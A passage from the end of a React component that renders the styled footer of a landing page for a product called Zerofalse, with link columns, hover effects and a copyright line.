                {['Docs', 'SDK Reference', 'API Reference', 'Status'].map((link, i) => (
                  <a key={i} href="#" style={{ fontSize: 'var(--text-sm)', color: 'rgba(255,255,255,0.5)', textDecoration: 'none', transition: 'var(--transition-fast)' }} onMouseEnter={(e) => e.target.style.color = 'white'} onMouseLeave={(e) => e.target.style.color = 'rgba(255,255,255,0.5)'}>{link}</a>
                ))}
              </div>
            </div>
            <div>
              <h4 style={{ fontSize: 'var(--text-sm)', fontWeight: 600, color: 'white', marginBottom: '16px' }}>Company</h4>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                {['About', 'Blog', 'Security', 'Privacy', 'Terms'].map((link, i) => (
                  <a key={i} href="#" style={{ fontSize: 'var(--text-sm)', color: 'rgba(255,255,255,0.5)', textDecoration: 'none', transition: 'var(--transition-fast)' }} onMouseEnter={(e) => e.target.style.color = 'white'} onMouseLeave={(e) => e.target.style.color = 'rgba(255,255,255,0.5)'}>{link}</a>
                ))}
              </div>
            </div>
          </div>
          <div style={{ paddingTop: '24px', borderTop: '1px solid rgba(255,255,255,0.1)', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '16px' }}>
            <div style={{ fontSize: 'var(--text-sm)', color: 'rgba(255,255,255,0.5)' }}>© 2026 Zerofalse. Stop AI Agent Attacks Before They Execute.</div>
            <div style={{ fontSize: 'var(--text-sm)', color: 'rgba(255,255,255,0.5)' }}>Made with Emergent</div>
          </div>
        </div>
      </footer>
    </div>
  );
}